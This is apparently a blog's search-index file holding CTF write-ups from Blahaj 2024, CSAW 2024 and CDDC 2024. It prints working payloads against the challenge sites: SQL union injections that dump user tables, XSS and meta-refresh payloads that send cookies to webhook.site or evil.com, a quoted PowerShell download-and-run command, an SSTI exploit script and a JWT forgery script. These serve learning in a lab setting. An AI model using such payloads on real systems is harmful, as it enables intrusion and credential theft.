{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome!","text":""},{"location":"#hello-i-am-re-and-this-is-my-blog","title":"Hello, I am Re and this is my blog","text":"<p>In this blog, you can expect: - My achievements and events - SDL ventures - Periodic blog posts</p>"},{"location":"Achievements/","title":"Achievements","text":"<ul> <li>24-11-2024: Qualified into finals for Blahaj Ctf 2024</li> <li>27-11-2024: CSIT kubenetes badge   </li> </ul>"},{"location":"Blogs/","title":"Blogs","text":"<ol> <li>03-02-2024</li> </ol>"},{"location":"SDL/","title":"SDL","text":""},{"location":"SDL/#coming-soon","title":"Coming soon","text":""},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/","title":"Blahaj 2024 Quals + Finals writeups","text":"<p>The very first ctf where I qualified into the finals :D</p> <p>Solves: BabySSTI(Web), Shark Lotto(Web), BabySQL(Web), Calculator(Web), Insecure Content(Web), Secure Content(Web), Data compressor(Web), Blahaj Fanpage(Web), Are You A Robot?(Rev), [DATA EXPUNGED](Forens), Trashcan Stroll(Forens), Significant bites(Forens), Hidden in plain sight(Misc), Unsafe PDF(Rev)</p> <p>The writeups will be ordered randomly and generally start with easy challanges/those solved with chatgpt.</p>"},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/#unsafe-pdf","title":"Unsafe pdf","text":"<p>I don't actually know how the javascript code was extracted as the browsers I tried (firefox and edge) did not seem to run anything. The code was given to me by my teammate and thrown into chatgpt to be reversed, giving the flag https://chatgpt.com/share/67444b9d-5fe0-800e-89ff-0ee8dec3c9a2 <code>blahaj{PDF_0bj3c7_HuN7}</code></p>"},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/#hidden-in-plain-sight","title":"Hidden in plain sight","text":"<p>The flag was said to be hidden within this message  Initially, I wanted to copy the text and use python to extract all capital letters. When pasting the message, I realised the lists were actually numbered uniquely.  This looks suspiciously like the ascii representation of characters, so I made a quick python script to extract that <pre><code>text = \"\"\"1. Lets hear a funny story about the shark! See if you can find the hidden flag~ The story starts below ^-^  \n98. Haj the shark loved swimming through the deep, blue ocean.  \n108. He was known for his unique shimmering scales that glistened in the sunlight.  \n97. Every dawn, Haj would race with the school of fish near the coral reef.  \n104. The other sea creatures admired his agility and grace underwater.  \n97. Even the turtles would cheer as Haj zoomed past them.  \n106. Despite his speed, Haj was gentle and friendly to all who crossed his path.  \n123. One day, Haj discovered an unusual underwater cave.  \n113. Curiosity got the better of him, and he decided to explore it.  \n117. Inside the cave were ancient symbols etched on the walls.  \n49. Haj felt a strange sense of wonder as he observed the symbols.  \n114. He wondered if they held the secrets of the ocean's past.  \n107. Excited by his discovery, Haj shared it with his ocean friends.  \n121. Together, they tried to decipher the symbols' meanings.  \n95. Their exploration brought them closer and forged a new bond among the sea creatures.  \n109. As a result, Haj decided to protect this newfound treasure.  \n52. The ocean felt different now, more mysterious and alive.  \n114. Haj often visited the cave, respecting its ancient beauty.  \n107. He felt honored to be the guardian of such a magical place.  \n100. In his heart, Haj knew the ocean held many more secrets to uncover.  \n48. Each day, he was thankful for the life he led in the ocean.  \n119. His adventures continued, swimming through the vast, mysterious sea.  \n110. Haj embraced the unknown with excitement and courage.  \n95. He found solace in the waves and harmony with the ocean's rhythm.  \n114. The ocean was his home, and he vowed to protect it always.  \n51. Haj the shark became a legend among the sea creatures.  \n110. The tales of his discoveries spread far and wide.  \n100. And as the sun set, Haj swam gracefully into the horizon.  \n51. His heart filled with joy and anticipation for what lay ahead.  \n114. He knew that every day brought a new adventure.  \n49. With his friends, Haj would explore the ocean's wonders.  \n110. Together, they celebrated their world under the sea.  \n103. And so, Haj continued his journey, forever curious and free.  \n125. The end.\"\"\"  \n\nlines = text.split(\"\\n\")  \nnums = [int(line.split(\".\", 1)[0]) for line in lines]  \nprint(''.join(chr(x) for x in nums))\n</code></pre> <code>blahaj{qu1rky_m4rkd0wn_r3nd3r1ng}</code></p>"},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/#are-you-a-robot","title":"Are you a robot?","text":"<p>A challenge where we have to run a random command to prove we are not a robot  Checking the clipboard, we can see what command we are about to run <pre><code>cmd /c PowerShell.exe \"iex ((New-Object System.Net.WebClient).DownloadString('http://robot.c1.blahaj.sg/captcha.ps1'))\" # \u2705 ''I am not a robot - reCAPTCHA Verification ID: 3029''\n</code></pre> Upon running the command, nothing happens.  I was too lazy to reverse engineer the script, so I threw this into https://any.run and used it to extract the code  <code>blahaj{free_powershell_glitch}</code></p>"},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/#data-expunged","title":"[Data expunged]","text":"<p>Simply open the pdf in some document editor and delete the black boxes</p>"},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/#trashcan-stroll","title":"Trashcan Stroll","text":"<p>We were told the file is suspiciously huge, so it is safe to assume there might be an embedded file. Analysis in cyberchef shows there is a <code>flag.txt</code> string within the file, suggesting there is a zip inside the file  Checking the file format for jpegs, we see that they end with <code>0xFF, 0xD9</code>.  The charaters <code>PK</code> after the EOI bytes, in conjunction with the fact that cyberchef reported pkzips embedded, hint at the kind of embedded file. Sure enough, checking the pkzip file format confirms it, as pkzips start with <code>0x50,0x4b,0x03,0x04</code>. Simply crop from those bytes to the end of the file, and we obtain the zip.   <code>blahaj{RubbI5h_on_Th3_MoV3}</code></p>"},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/#significant-bites","title":"Significant bites","text":"<p>Throw the file into https://www.aperisolve.com/, get the flag  <code>blahaj{1_W4N73D_70_S33_73H_w0rLD_1N_c0L0R}</code></p>"},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/#babyssti","title":"BabySSTI","text":"<p>The chal hints at jinja ssti, so we know to use <code>{{}}</code>. We are told to leak <code>hakerman</code>, so we do that.  Following that, we use one of the payloads from hacktricks to extract the flag  <code>blahaj{SsT1_ExpL01T}</code></p>"},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/#shark-lotto","title":"Shark lotto","text":"<p>We are given the source code for this challenge. Checking out main.py, we see this: <pre><code>@app.route('/spin', methods=['POST'])  \ndef spin():  \n    bet_amount = request.json.get('bet')  \n    money = request.json.get('money')  \n    slotImage1 = random.randrange(0, 4)  \n    slotImage2 = random.randrange(0, 4)  \n    slotImage3 = random.randrange(0, 4)  \n\n    if (money &gt;= 13371337):  \n        return jsonify({'flag': \"blahaj{???}\"})\n    ...\n</code></pre> The solution is to just send a post request to <code>/spin</code> with  <pre><code>{\"bet\":0, \"money\": 13371337}\n</code></pre> and we get the flag. <code>blahaj{d0n7_7rus7_th3_cl13nt}</code></p>"},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/#babysql","title":"Babysql","text":"<p>We are given a site where we first need an account before we are able to view products. I had initially (unsuccessfully) tried to inject sql into the registration, login and adminLogin page, before reading the challenge description which hinted the sql injection was to be done in the product search page. The first thing I tried was a simple <code>or 1=1</code> statement to ensure sql injection worked.  Additional queries such as <code>' and 1=0;--</code> resulted in no results shown, confirming we could inject sql.  Next, we need to extract more information about the database used. This could be done through union attacks. The first step is to try to extract information about the fields retrieved when querying for a product. The website displays both the product and its price, so we first try blindly guessing there are 2 fields. <code>' union select 'a','b';--</code></p> <p>It is also possible (and probably better) to guess the number of fields by using <code>order by n</code>, for example <code>' order by 4;--</code> gives an error and we know there are 3 fields.</p> <p> Unfortunately, we get an error when trying that query. I blindly added another column to the union and thankfully got no error. <code>' union select 'a','b', 'c';--</code>  Luckily for us, all the data is returned as strings, so no further guessing was needed. </p> <p>TODO: It turns out selecting integers also works. Not sure if it is due to the way the server handles queries or sql is just like that</p> <p>Next, we need to extract the table names. Before that, we should try to find what variant of sql is used. Sqlite is lightweight and commonly used, so I googled payloads for sql. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md <code>' union select 'a',sqlite_version(),'c';--</code>  After confirming we are indeed using sqlite, we can use other payloads to obtain the table names <code>' UNION SELECT 'a','b',tbl_name FROM sqlite_master WHERE type='table';--</code>  From there, we can extract the table structure <code>' UNION SELECT 'a','b',name FROM PRAGMA_TABLE_INFO('PRIV_USERS')--</code>  (The table structure was the same for <code>PRIV_USERS</code> and <code>USERS_ZAHSHBSH</code>) Now that we know the tables and their structures, we can try extracting data from them thru queries such as <code>' union SELECT 'a', is_admin,username FROM PRIV_USERS--</code> and <code>' union SELECT 'a', password,username FROM PRIV_USERS--</code>. It was revealed that the users <code>Cisco</code>, <code>Leon</code> and <code>Rigby</code> were all admin, and their passwords looked like this  Initially, I thought those were fixed-length randomly generated passwords and was confused when none of those passwords worked for the admin login page. I was rather lost and spent a bit of time just trying different combinations of usernames and passwords. However, when checking out <code>USERS_ZAHSHBSH</code>, all passwords were in the same format, suggesting they were hashed.   Since I knew my own password, I compared different hashing algorithms and discovered passwords were SHA256 hashed.  With the 3 different accounts, using a password cracker like hashcat could probably recover the password of at least 1 account. Brute forcing the passwords using the 10m wordlist, we can recover 2 passwords.  From there, we can successfully login and get the flag  <code>blahaj{sQLi_iS_c00l}</code></p>"},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/#calculator","title":"Calculator","text":"<p>We are given a website where we can evaluate expressions. The goal of the challenge is to exfiltrate a cookie when the admin bot visits this site.  At first I assumed this was a SSTI challenge, and tried identifying the server by trying various expressions. I first tried parenthesis, which seemed to be blacklisted  I then tried an array, which interestingly worked.  Adding an array and a number together also worked, which hinted at javascript being used  ^ javascript jank Next, we should test the capabilities of the javascript runtime used. I tried the expression <code>document.cookie</code>, which returned <code>undefined</code>. I then tried setting <code>window.location</code>, however some character was blacklisted  By testing various string literals, I was able to use (`)  to create strings  By using an expression like <pre><code>window.location=`lol`\n</code></pre> , I was redirected successfully.   At this point I realized the challenge was not about SSTI since the javascript was executed in the browser. Knowing this, I blindly constructed a payload to exfiltrate the document cookie <pre><code>window.location=`https://webhook.site/...?`+document.cookie \n</code></pre> By submitting the payload to the bug report url, we are able to get the flag <code>http://calculator.c1.blahaj.sg/calculate?expression=window.location%3D%60https%3A%2F%2Fwebhook.site%2F...%3F%60%2Bdocument.cookie</code> <code>blahaj{3VaL_i5_WeIrD}</code></p> <p>In hindsight, we were told the flag was found in cookies, which should have hinted at XSS instead of SSTI. If I had bothered looking at the html, I would've even found the eval expression:  <pre><code>&lt;div class=\"container\"&gt;\n        &lt;h1 class=\"text-center\"&gt;Calculation Result&lt;/h1&gt;\n        &lt;p class=\"text-center\"&gt;Expression: &lt;strong&gt;1+2&lt;/strong&gt;&lt;/p&gt;\n\n            &lt;p class=\"text-center\"&gt;Result: &lt;span id=\"result\" class=\"font-weight-bold\"&gt;3&lt;/span&gt;&lt;/p&gt;\n            &lt;script&gt;\n                try {\n                    const result = eval(1+2);\n                    document.getElementById('result').innerText = result;\n                } catch (error) {\n                    document.getElementById('result').innerText = 'Error in expression';\n                }\n            &lt;/script&gt;\n\n        &lt;div class=\"text-center\"&gt;\n            &lt;button onclick=\"window.history.back();\" class=\"btn btn-secondary\"&gt;Go Back&lt;/button&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n</code></pre></p>"},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/#insecure-content","title":"Insecure content","text":"<p>We are given the source code for this challenge. This is yet another XSS challenge where the text you input will be reflected in html. The vulnerable function is <code>generate_page()</code>, which concatenates the user input without any escaping <pre><code>def generatenamepage(name):  \n    # TODO Xss vuln here. However there is csp.  \n    return \"\"\"&lt;!DOCTYPE html&gt;  \n    &lt;html lang=\"en\"&gt;    &lt;head&gt;        &lt;meta charset=\"UTF-8\"&gt;        &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;        &lt;title&gt;Hello!&lt;/title&gt;            &lt;/head&gt;  \n    &lt;body&gt;        &lt;div&gt;            &lt;h1&gt;Hello, \"\"\"+name+\"\"\"!&lt;/h1&gt;  \n            &lt;p&gt;I hope you like flags! In fact, here is a flag: blahaj{[FLAG REDACTED]}&lt;/p&gt;            &lt;p&gt;Sadly, only the admin bot can see it :'(&lt;/p&gt;        &lt;/div&gt;    &lt;/body&gt;    &lt;/html&gt;\"\"\"\n</code></pre> Unfortunately, there is quite an extensive list of CSPs added to every response by the server. <pre><code>@app.after_request  \ndef apply_csp(response: Response) -&gt; Response:  \n    csp = (  \n        \"connect-src 'none'; \"  \n        \"font-src 'none'; \"        \"frame-src 'none'; \"        \"img-src 'self'; \"        \"manifest-src 'none'; \"        \"media-src 'none'; \"        \"object-src 'none'; \"        \"worker-src 'none'; \"        \"style-src 'self'; \"        \"frame-ancestors 'none'; \"        \"block-all-mixed-content;\"        \"require-trusted-types-for 'script';\"    )  \n    response.headers['Content-Security-Policy'] = csp\n</code></pre> Throwing the CSP into a CSP checker, we see that the <code>script-src</code> policy is missing, meaning any script, including injected scripts, will run.  We begin crafting a payload and testing it. First, a simple payload to ensure XSS works. </p> <p>While testing, I had also tried using malformed script tags to attempt capturing the rest of the webpage as a string and sending a request with that string. While it did not seem to work, this experiment would prove useful in the following challenge #Secure content</p> <p>Following that, I tried to extract the flag from the page. <pre><code>&lt;script&gt;  \n    setTimeout(()=&gt;alert(Array.from(document.getElementsByTagName(\"p\"))[0].innerHTML), 100)  \n&lt;/script&gt;\n</code></pre></p> <p>The timeout is to ensure the script is run after the rest of the page is loaded. This could probably be done with some dom event listener but I was lazy</p> <p> Next, we have to exfiltrate the flag. I tried using <code>navigator.sendBeacon</code> but that was blocked by the csp. <pre><code>&lt;script&gt;  \n    setTimeout(()=&gt;navigator.sendBeacon(\"https://webhook.site/...?\"+Array.from(document.getElementsByTagName(\"p\"))[0].innerHTML), 100)  \n&lt;/script&gt;\n</code></pre>  We could also try redirects, however the admin block will prevent that: <pre><code>...\n// blocks cross-origin redirects  \nawait page.setRequestInterception(true);  \n// Prevents any redirections out of the site  \npage.on('request', request =&gt; {  \n    requestURLObj = new URL(request.url())  \n    if (request.isNavigationRequest() &amp;&amp; (requestURLObj.origin != urlObj.origin)) {  \n      request.abort();  \n      console.log('uh oh')  \n      console.log(requestURLObj)  \n    } else {  \n        console.log('all good')  \n        request.continue();  \n    }  \n});   \nawait page.goto(url);\n...\n</code></pre> It should be noted that the bot specifically blocks navigation requests(E.g. redirects) out of the page, but the bot does not block new tabs from being created. We can exploit that by using <code>window.open()</code> <pre><code>&lt;script&gt;  \n    setTimeout(()=&gt;window.open(\"https://webhook.site/...?\"+Array.from(document.getElementsByTagName(\"p\"))[0].innerHTML), 100)  \n&lt;/script&gt;\n</code></pre>  All that is left is to submit that payload to the <code>/report</code> endpoint, where the admin bot will visit that site and view the version of the page with the actual flag. <code>http://127.0.0.1:8000/greet?name=%3Cscript%3E+++++setTimeout%28%28%29%3D%3Ewindow.open%28%22https%3A%2F%2Fwebhook.site%2F73f9aac1-f3cc-4784-bec3-1615d26a4031%3F%22%2BArray.from%28document.getElementsByTagName%28%22p%22%29%29%5B0%5D.innerHTML%29%2C+500%29+%3C%2Fscript%3E</code> <code>blahaj{n0t_50_s3cuRe_1sit}</code></p>"},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/#secure-content","title":"Secure content","text":"<p>This challenge is similar to #Insecure content, with the following changes 1. The <code>script-src</code> policy is now present <pre><code>   @app.after_request  \ndef apply_csp(response: Response) -&gt; Response:  \n    csp = (  \n        \"connect-src 'none'; \"  \n        \"font-src 'none'; \"        \"frame-src 'none'; \"        \"img-src 'self'; \"        \"manifest-src 'none'; \"        \"media-src 'none'; \"        \"object-src 'none'; \"        \"script-src 'none'; \"        \"worker-src 'none'; \"        \"style-src 'self'; \"        \"frame-ancestors 'none'; \"        \"block-all-mixed-content;\"        \"require-trusted-types-for 'script';\"    )  \n    response.headers['Content-Security-Policy'] = csp  \n    return response\n</code></pre> 2. Puppeteer is no longer used. As such, redirects are now allowed <pre><code>@app.route('/adminbot', methods=['POST'])  \ndef adminbot():  \n    url = request.form.get('url')  \n\n    if not url or not url.startswith('http://'+ipport+'/'):  \n        return \"Invalid URL. It must start with 'http://\"+ipport+\"/'.\", 400  \n\n    command = f\"chromium --virtual-time-budget=10000 --no-sandbox --headless --disable-gpu --timeout=5000 {shlex.quote(url)}\"  \n    subprocess.Popen(command, shell=True)  \n    return \"Admin bot will see your request soon\"\n</code></pre> For this challenge, I drew some inspiration from Insecure content, where I had previously tried a form of dangling markup. Due to the CSP, images can only originate from the server, so using images to exfiltrate data won't work. However, the website also suggests using <code>meta</code> tags to change the window location, which fits with redirects now being allowed. By testing their payload, we see it indeed does work <pre><code>&lt;meta http-equiv=\"refresh\" content='60; URL=http://evil.com/log.cgi?\n</code></pre></p> <p>Interestingly, double quotes did not seem to work. </p> <p><pre><code>...\n&lt;p&gt;Hello, &lt;meta http-equiv=\"refresh\" content=\"60; URL=http://evil.com/log.cgi?! I hope you like flags! In fact, here is a flag: blahaj{[FLAG REDACTED]}. Sadly, only the admin bot can see it :\" (&lt;p=\"\"&gt;\n        &lt;/p&gt;\n</code></pre> Thus, we can craft a payload that redirects to our website and extract the flag from there <code>http://securecontent.c1.blahaj.sg/greet?name=%3Cmeta+http-equiv%3D%22refresh%22+content%3D%275%3BURL%3Dhttps%3A%2F%2Fwebhook.site%2F...%3F</code> <code>blahaj{D4nG13_tH3_MArKuP}</code></p>"},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/#blahaj-fanpage","title":"Blahaj fanpage","text":"<p>Honestly, I did not find this challenge fun as it was quite guessy. TODO</p>"},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/#data-compressor","title":"Data compressor","text":"<p>TODO</p>"},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/#post-ctf-lessons","title":"Post ctf lessons","text":"<p>Official solutions at https://github.com/blahajctf/blahajctf24-public</p>"},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/#screenshooter","title":"Screenshooter","text":"<p>We are given LFI by by means of screenshots using the <code>file://</code> protocol. Use that to leak information to construct flask debug pin for RCE.</p>"},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/#process-killer-panel","title":"Process killer panel","text":"<p>Php deserialize RCE(Or a POP chain?). https://book.hacktricks.xyz/pentesting-web/deserialization#php Vulnerability comes from <code>MainClass::importProcesses()</code> which uses <code>unserialize</code> on user data.</p>"},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/#user-management-system","title":"User management system","text":"<p>I don't quite understand but it is something to do with invalid string size being stored when strings are replaced from <code>chr(0)+\"*\"+chr(0)</code>(Prefix to php protected fields?) to <code>\\0\\0\\0</code>  to be stored in a db and the reverse happening when unserializing, leading to the object being unserialized incorrectly? https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/  </p>"},{"location":"Ctfs/Blahaj%202024%20Quals%20%2B%20Finals%20writeups/#ssti-golf","title":"SSTI Golf","text":"<p>https://rwandi-ctf.github.io/BlahajCTF2024/SSTI-Golf/ A SSTI challenge with blacklisted terms and a string length restriction. The <code>config</code> variable is not blacklisted and we can split up and persist our payloads through it. <pre><code>import requests\npayloads = [\n    '{{config.update({\"u\":config.update})}}', #we are storing the config.update() method into a config variable itself to minimise characters \n    '{{config.u({\"a\":\"\".__class__.mro()})}}', #the next few lines just breaks up the payload into multiple parts and stores them into config vars\n    '{{config.u({\"b\":\"__subclasses__\"})}}',\n    '{{config.u({\"c\":config.a[1]})}}',\n    '{{config.u({\"d\":config.c[config.b]})}}',\n    '{{config.u({\"e\":config.d()[357]})}}',\n    \"{{config.e('flag.txt').read()}}\" ## calling read() on the initialised LazyFile class\n]\n\nfor i in payloads:\n    resp=requests.post(\"http://golf.c1.blahaj.sg/greet\",data={\"comment\":i})\n    print(resp.content)\n</code></pre> Code taken directly from the writeup above, full credits to them</p>"},{"location":"Ctfs/CSaw%202024%20Qualifier%20writeups/","title":"Lost pyramid","text":"<p>A fun little challenge involving jwt tokens. The wmebsite has multiple rooms with their own endpoints. Noteworthy rooms are <code>/kings_liar</code> and <code>/scarab_room</code> Notably,  the scarab room has some suspicious code: <pre><code>if request.method == 'POST':  \n    name = request.form.get('name')  \n    if name:  \n        kings_safelist = ['{','}', '\ud80c\udc79', '\ud80c\udda3','\ud80c\udc00', '\ud80c\udc01', '\ud80c\udc02', '\ud80c\udc03', '\ud80c\udc04', '\ud80c\udc05', '\ud80c\udc06', '\ud80c\udc07', '\ud80c\udc08', '\ud80c\udc09', '\ud80c\udc0a',   \n                            '\ud80c\udc10', '\ud80c\udc11', '\ud80c\udc12', '\ud80c\udc13', '\ud80c\udc14', '\ud80c\udc15', '\ud80c\udc16', '\ud80c\udc17', '\ud80c\udc18', '\ud80c\udc19', '\ud80c\udc1a', '\ud80c\udc1b', '\ud80c\udc1c', '\ud80c\udc1d', '\ud80c\udc1e', '\ud80c\udc1f',  \n                            '\ud80c\udc20', '\ud80c\udc21', '\ud80c\udc22', '\ud80c\udc23', '\ud80c\udc24', '\ud80c\udc25', '\ud80c\udc26', '\ud80c\udc27', '\ud80c\udc28', '\ud80c\udc29', '\ud80c\udc2a', '\ud80c\udc2b', '\ud80c\udc2c', '\ud80c\udc2d', '\ud80c\udc2e', '\ud80c\udc2f',  \n                            '\ud80c\udc30', '\ud80c\udc31', '\ud80c\udc32', '\ud80c\udc33', '\ud80c\udc34', '\ud80c\udc35', '\ud80c\udc36', '\ud80c\udc37', '\ud80c\udc38', '\ud80c\udc39', '\ud80c\udc3a', '\ud80c\udc3b']    \n        name = ''.join([char for char in name if char.isalnum() or char in kings_safelist])  \n\n        return render_template_string('''  \n            &lt;!DOCTYPE html&gt;            &lt;html lang=\"en\"&gt;            ...            &lt;body&gt;                &lt;a href=\"{{ url_for('hallway') }}\" class=\"return-link\"&gt;RETURN&lt;/a&gt;                                {% if name %}  \n                    &lt;h1&gt;\ud80c\udc79\ud80c\udc79\ud80c\udc79 Welcome to the Scarab Room, '''+ name + ''' \ud80c\udc79\ud80c\udc79\ud80c\udc79&lt;/h1&gt;  \n                {% endif %}                            &lt;/body&gt;  \n            &lt;/html&gt;        ''', name=name, **globals())\n</code></pre> Here, name is directly added to the template then rendered , allowing for SSTI. We just so happen to be able to use curly brackets in name, which means we are able to inject jinja expressions into the code. Unfortunately, only alphanumeric characters and hierographics(which are useless) are allowed, meaning we can't directly invoke any code.  Since all global variables are provided to the template we, are able to access the variables defined: <pre><code># Load keys  \nwith open('private_key.pem', 'rb') as f:  \n    PRIVATE_KEY = f.read()  \n\nwith open('public_key.pub', 'rb') as f:  \n    PUBLICKEY = f.read()  \n\nKINGSDAY = os.getenv(\"KINGSDAY\", \"TEST_TEST\")  \n\ncurrent_date = datetime.datetime.now()  \ncurrent_date = current_date.strftime(\"%d_%m_%Y\")\n</code></pre> <code>PRIVATE_KEY</code> contains an underscore and can not be accessed through the template injection here.  On to the <code>kings_liar</code>, whose template contains our flag: <pre><code>@app.route('/kings_lair', methods=['GET'])  \ndef kings_lair():  \n    token = request.cookies.get('pyramid')  \n    if not token:  \n        return jsonify({\"error\": \"Token is required\"}), 400  \n\n    try:  \n        decoded = jwt.decode(token, PUBLICKEY, algorithms=jwt.algorithms.get_default_algorithms())  \n        if decoded.get(\"CURRENT_DATE\") == KINGSDAY and decoded.get(\"ROLE\") == \"royalty\":  \n            return render_template('kings_lair.html')  \n        else:  \n            return jsonify({\"error\": \"Access Denied: King said he does not way to see you today.\"}), 403  \n    except jwt.ExpiredSignatureError:  \n        return jsonify({\"error\": \"Access has expired\"}), 401  \n    except jwt.InvalidTokenError as e:  \n        print(e)  \n        return jsonify({\"error\": \"Invalid Access\"}), 401\n</code></pre> Checks are performed to ensure our decoded pyramid cookie has the correct date and role. This cookie is set in the hallway, but is not the right value we want. Now, we need a way to tamper with the token, while keeping its signature valid. Upon analysis, the token is first set in the <code>/enterance</code>, and signed using EdDSA, an asymmetric signing algorithm <pre><code>@app.route('/entrance', methods=['GET'])  \ndef entrance():  \n    payload = {  \n        \"ROLE\": \"commoner\",  \n        \"CURRENT_DATE\": f\"{current_date}_AD\",  \n        \"exp\": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=(365*3000))  \n    }    token = jwt.encode(payload, PRIVATE_KEY, algorithm=\"EdDSA\")  \n    response = make_response(render_template('pyramid.html'))  \n    response.set_cookie('pyramid', token)  \n    return response\n</code></pre> In order to product a valid token, we would need to know the private key, which we can't access. However, consider this line of code again <pre><code>decoded = jwt.decode(token, PUBLICKEY, algorithms=jwt.algorithms.get_default_algorithms())  \n</code></pre> Here, the token supports using multiple signing algorithms, including symmetric ones such as <code>HS256</code>. In that case, the key used for verification is also the key used for signing. By knowing the public key(which we obtained previously) , we can forge our own tokens! Solution: <pre><code>import jwt\nimport datetime\nPUBLICKEY = b\"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPIeM72Nlr8Hh6D1GarhZ/DCPRCR1sOXLWVTrUZP9aw2\"\npayload = {  \n    \"ROLE\": \"royalty\",  \n    \"CURRENT_DATE\": f\"03_07_1341_BC\",  \n    \"exp\": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=(365*3000))  \n}\ntoken = jwt.encode(payload, PUBLICKEY) # Default algorithm is HS256\nprint(token)\n</code></pre> Using this cookie, we are able to access the king's liar: </p> <p>Interestingly, this challenge would have been solved faster if I bothered checking pyjwt's github: https://github.com/jpadilla/pyjwt/security/advisories/GHSA-ffqj-6fqr-9h24 This is a fun little reminder to always see if there are any known vulnerabilities in the libraries used.</p>"},{"location":"Ctfs/Cddc%202024%20qualifier%20writeups/","title":"Cddc 2024 qualifier writeups","text":"<p>At the point of writing, I do not have access to the challenges so everything is based off memory and what I have. For future reference in case I forget my solutions when the challenges are re-opened</p> <p>Web1</p>"},{"location":"Ctfs/Cddc%202024%20qualifier%20writeups/#a-purrfect-chat","title":"A purrfect chat","text":"<p>We are given a website where we can input text to check if it matches the flag. Sending the input does not make any http requests, so we know the flag is checked locally.  Taking the bundled js file, we can see the last line seems to contain the compiled code. That line can be thrown into a js decompiler and beautifier, from which we have to manually reverse engineer the code. Also, renaming variables is really helpful for your sanity.  <pre><code>Q.jsxs(\"div\", {  \n    className: \"\",  \n    children: [  \n        Q.jsx(MaybeJsxCompontent, { result: var2, value: var1 }),  \n        Q.jsxs(\"div\", {  \n            className: \"\",  \n            children: [  \n                Q.jsx(\"input\", { type: \"text\", className: \"\", placeholder: \"flag\", value: var1, onChange: (o) =&gt; setVar1(o.target.value) }),  \n                Q.jsx(\"button\", { className: \"w-6\", onClick: checkAns, children: Q.jsx(\"img\", { src: Np, alt: \"send\", className: \"\" }) }),  \n            ],  \n        }),  \n    ],  \n})\n</code></pre> <pre><code>const [var1, setVar1] = He.useState(\"\"),  \n    [var2, setVar2] = He.useState(\"\"),  \n    checkAns = () =&gt; {  \n    //  \n        var1.length === 18 &amp;&amp;  \n        var1[8] === \"F\"/*.charCodeAt() === parseInt(\"70\")*/ &amp;&amp;  \n        var1[1] === \"e\" /*.charCodeAt() === 101*/ &amp;&amp;  \n        var1[13] === \"3\" &amp;&amp;  \n        var1.slice(4, 7/*-11*/) === \"ome\"/*\"You are awesome!\".substr(-4, 3)*/ &amp;&amp;  \n        var1[0].charCodeAt() === \"W\"/*parseInt(var1[8].charCodeAt()) + 17*/  \n            ? setVar2(\"o\") // &lt;-- YOU WANT THIS  \n            : setVar2(\"x\");  \n    };\n</code></pre> <pre><code>const Zi = (e) =&gt; {  \n    // Prob some function to make a variable reactive?  \n        (yc ? \"production\" : void 0) !== \"production\" &amp;&amp; typeof e != \"function\" &amp;&amp; console.warn(\"[DEPRECATED] Passing a vanilla store will be unsupported in a future version. Instead use `import { useStore } from 'zustand'`.\");  \n        const t = typeof e == \"function\" ? bd(e) : e,  \n            n = (r, l) =&gt; xp(t, r, l);  \n        return Object.assign(n, t), n;  \n    },  \n    _p = (e) =&gt; (e ? Zi(e) : Zi),  \n    Cp = _p(() =&gt; ({ items: [\"10\", \"11\", 0, 1, 2, 3, 18, 176] }));\nfunction MaybeJsxCompontent({ result: isaOorX, value: test }) {  \n    const [text, setText] = He.useState(\"Please input the answer\"),  \n        l = [\"10\", \"11\", 0, 1, 2, 3, 18, 176]/*Cp((maybeArray) =&gt; maybeArray.items)*/,  \n        o = () =&gt; /\\)$/.test(test) &amp;&amp; test[7] === \"2\"/*l[4].toString()*/ &amp;&amp; test[9] === \"r\"/*.charCodeAt() === parseInt(100 + (l[7] % l[6]))*/ &amp;&amp; test.slice(11, 13) === \"nt\" &amp;&amp; test[2] === \"1\"/*l[3] + \"\"*/,  \n        u = () =&gt; test[15] === \"d\" &amp;&amp; test[3] === 'c'/*.charCodeAt() === 99*/ &amp;&amp; test[14] === \"n\" /*.charCodeAt() === parseFloat(l[1] + l[2])*/ &amp;&amp; test[10] === \"0\";  \n    return (  \n        He.useEffect(() =&gt; {  \n            isaOorX === \"o\" &amp;&amp; test[16] === \":\"/*.charCodeAt() === 58*/ &amp;&amp; o() &amp;&amp; u() ? setText(\"Correct!\") : isaOorX === \"x\" &amp;&amp; setText(\"Try again :(\");  \n        }, [isaOorX]),  \n            Q.jsx(\"span\", { className: \"\", children: text })  \n    );  \n}\n</code></pre> Putting everything together, we get <code>\"We1come2Fr0nt3nd:)\"</code></p>"},{"location":"Ctfs/Cddc%202024%20qualifier%20writeups/#traefik","title":"Traefik","text":"<p>This challenge has a simple basic auth protected web server. This challenge got a suspiciously high number of solves 